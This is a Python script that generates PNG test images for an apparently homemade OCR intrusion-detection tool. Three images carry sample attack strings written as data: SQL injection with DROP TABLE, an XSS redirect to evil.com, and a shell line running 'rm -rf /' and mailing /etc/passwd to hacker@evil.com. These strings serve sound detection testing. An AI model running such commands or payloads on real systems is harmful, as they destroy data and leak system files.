#!/usr/bin/env python3
"""
Create test images for OCR intrusion detection testing.
Run this script to generate sample images with text for testing.
"""

from PIL import Image, ImageDraw, ImageFont
import os

def create_text_image(text, filename, size=(800, 400), bg_color='white', text_color='black'):
    """Create an image with text for OCR testing."""
    try:
        # Create test images directory
        os.makedirs('test_images', exist_ok=True)
        
        # Create image with background
        image = Image.new('RGB', size, bg_color)
        draw = ImageDraw.Draw(image)
        
        # Try to use a default font, fallback to basic if not available
        try:
            # Use default font (usually better for OCR)
            font = ImageFont.load_default()
        except:
            font = None
        
        # Draw text with proper positioning
        lines = text.split('\n')
        y_offset = 50
        line_height = 30
        
        for line in lines:
            draw.text((50, y_offset), line, fill=text_color, font=font)
            y_offset += line_height
        
        # Save image
        filepath = os.path.join('test_images', filename)
        image.save(filepath)
        print(f"✅ Created: {filepath}")
        return True
        
    except Exception as e:
        print(f"❌ Error creating {filename}: {str(e)}")
        return False

def main():
    """Create all test images."""
    print("🖼️  Creating test images for OCR analysis...")
    
    # Test images data
    images = [
        # Malicious images
        {
            'text': "Username: admin\nPassword: ' OR 1=1; DROP TABLE users; --\nAccess: Granted",
            'filename': 'malicious_sql.png',
            'type': 'malicious'
        },
        {
            'text': "<script>\nalert('XSS Attack!');\nwindow.location='http://evil.com';\n</script>",
            'filename': 'malicious_xss.png', 
            'type': 'malicious'
        },
        {
            'text': "File: document.txt; rm -rf /\nCommand: cat /etc/passwd | mail hacker@evil.com\nExecute: System compromise",
            'filename': 'malicious_cmd.png',
            'type': 'malicious'
        },
        
        # Normal images
        {
            'text': "System Status Report\nAll services: Running\nCPU Usage: 15%\nMemory: 8.2GB / 16GB\nLast Backup: Success",
            'filename': 'normal_system.png',
            'type': 'normal'
        },
        {
            'text': "Employee Information\nName: John Smith\nDepartment: IT Support\nEmail: john.smith@company.com\nPhone: (555) 123-4567\nStatus: Active",
            'filename': 'normal_user.png',
            'type': 'normal'
        },
        {
            'text': "Weekly Team Meeting\nDate: January 15, 2024\nAttendees: 8 people\nTopics Discussed:\n- Project progress updates\n- Q1 planning session\n- Team building activities",
            'filename': 'normal_meeting.png',
            'type': 'normal'
        }
    ]
    
    # Create images
    created = 0
    failed = 0
    
    for img_data in images:
        success = create_text_image(
            img_data['text'],
            img_data['filename']
        )
        
        if success:
            created += 1
            print(f"   📝 {img_data['type'].upper()}: {img_data['filename']}")
        else:
            failed += 1
    
    print(f"\n🎯 Summary:")
    print(f"   ✅ Created: {created} images")
    print(f"   ❌ Failed: {failed} images")
    
    if created > 0:
        print(f"\n📁 Images saved in: test_images/")
        print(f"🚀 Ready to test OCR analysis!")
        print(f"\nNext steps:")
        print(f"1. Start your Flask app: python app_flask.py")
        print(f"2. Go to: http://localhost:5000/ids")
        print(f"3. Upload images from test_images/ folder")
        print(f"4. Test intrusion detection!")
    
    return created > 0

if __name__ == "__main__":
    main()
